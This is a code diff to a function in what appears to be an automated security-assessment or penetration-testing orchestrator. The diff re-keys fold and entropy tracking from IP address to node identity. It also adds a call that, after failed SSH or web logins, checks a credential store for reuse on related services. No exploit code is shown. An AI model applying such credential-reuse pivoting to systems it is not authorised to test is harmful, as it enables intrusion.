@@ -6460,6 +7748,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
             refreshed_target,
             ip=ip,
             discovery_dir=DISCOVERY_DIR,
+            view_state=_load_fresh_view_state(ip) or t.get("view_state") or {},
         )
         refreshed_applicable = applicable_wickets_for_domains(refreshed_domains, domain_wickets)
 
@@ -6474,7 +7763,7 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
             new_folds = new_fd.detect_all(DISCOVERY_DIR, CVE_DIR, SKG_HOME)
             new_fm = FoldManager()
             for f in new_folds:
-                if ip in f.location or f.location.endswith(ip):
+                if _fold_identity_key(f) == identity_key:
                     new_fm.add(f)
             new_fold_boost = new_fm.total_gravity_weight()
         except Exception as exc:
@@ -6541,20 +7830,23 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
                     print(f"      Approve:  skg proposals trigger {result['proposal_id']}")
                 # Record current E (not a higher value) — neutral, not penalised
                 for _n, _i in all_run_insts:
-                    _i.entropy_history.setdefault(ip, []).append(E_after)
+                    _i.entropy_history.setdefault(node_key, []).append(E_after)
             else:
                 print(f"    ○ No entropy change (E={E_after:.2f})")
                 # Record a single no-op outcome. Repeated stagnation across
                 # cycles triggers failed_to_reduce(), not one flat attempt.
                 for _n, _i in all_run_insts:
-                    _i.entropy_history.setdefault(ip, []).append(E_after)
+                    _i.entropy_history.setdefault(node_key, []).append(E_after)
 
         else:
             error = result.get("error", "execution failed (no error message captured)")
             print(f"    ✗ Failed: {error}")
             # Hard failure — record 999 so failed_to_reduce() fires immediately
             for _n, _i in all_run_insts:
-                _i.entropy_history.setdefault(ip, []).append(999)
+                _i.entropy_history.setdefault(node_key, []).append(999)
+            # Pivot detection: if SSH/web auth failed, check credential store
+            # for reuse opportunities on related services.
+            _try_instrument_pivot(node_key, ip, t, result, instruments, run_id, DISCOVERY_DIR)
 
         # Process a broader slice of the field each cycle so whole-network
         # gravity behaves like a substrate sweep, not a top-3 scheduler.
@@ -6653,19 +7945,17 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
         from skg.kernel.folds import FoldDetector, FoldManager
         fold_state_dir = Path(out_dir) / "folds"
         fold_state_dir.mkdir(parents=True, exist_ok=True)
-        refreshed_by_ip: dict[str, FoldManager] = {}
+        refreshed_by_identity: dict[str, FoldManager] = {}
         for fold in FoldDetector().detect_all(
             events_dir=DISCOVERY_DIR,
             cve_dir=CVE_DIR,
             toolchain_dir=SKG_HOME,
         ):
-            for target in surface.get("targets", []):
-                tip = target["ip"]
-                if tip in fold.location or fold.location.endswith(tip):
-                    refreshed_by_ip.setdefault(tip, FoldManager()).add(fold)
-                    break
-        for ip, fm in refreshed_by_ip.items():
-            fm.persist(fold_state_dir / f"folds_{ip.replace('.', '_')}.json")
+            identity_key = _fold_identity_key(fold)
+            if identity_key:
+                refreshed_by_identity.setdefault(identity_key, FoldManager()).add(fold)
+        for identity_key, fm in refreshed_by_identity.items():
+            fm.persist(fold_state_dir / _fold_state_filename(identity_key))
     except Exception as exc:
         reporter.emit("fold_persist", f"failed to persist refreshed fold state: {exc}", exc=exc)
 
